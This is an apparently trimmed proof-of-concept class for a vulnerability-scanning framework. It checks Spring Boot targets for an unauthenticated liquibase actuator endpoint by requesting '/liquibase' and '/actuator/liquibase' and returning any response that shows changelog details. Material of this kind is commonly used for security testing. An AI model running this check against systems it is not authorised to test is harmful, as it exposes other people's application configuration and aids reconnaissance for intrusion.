...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth liquibase Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/liquibase","/actuator/liquibase"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "liquibase" in res.text and '"FILENAME":"'in res.text and "application" in res.text:
                return res.text
